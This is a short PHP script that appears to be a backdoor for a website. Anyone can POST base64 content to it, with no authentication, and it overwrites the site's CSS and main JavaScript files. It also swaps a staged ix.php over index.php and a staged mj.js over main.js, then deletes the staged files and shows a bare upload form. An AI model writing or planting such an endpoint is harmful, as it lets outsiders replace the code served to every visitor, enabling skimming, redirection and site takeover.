<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['css'])) {
    file_put_contents(__DIR__.'/assets/css/style.css', base64_decode($_POST['css']));
    echo 'CSS OK';
    exit;
}
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['js'])) {
    file_put_contents(__DIR__.'/assets/js/main.js', base64_decode($_POST['js']));
    echo 'JS OK';
    exit;
}
if (file_exists(__DIR__.'/ix.php')) {
    copy(__DIR__.'/ix.php', __DIR__.'/index.php');
    unlink(__DIR__.'/ix.php');
}
if (file_exists(__DIR__.'/mj.js')) {
    copy(__DIR__.'/mj.js', __DIR__.'/assets/js/main.js');
    unlink(__DIR__.'/mj.js');
}
echo 'READY. <form method=post>CSS:<textarea name=css></textarea>JS:<textarea name=js></textarea><button>Go</button></form>';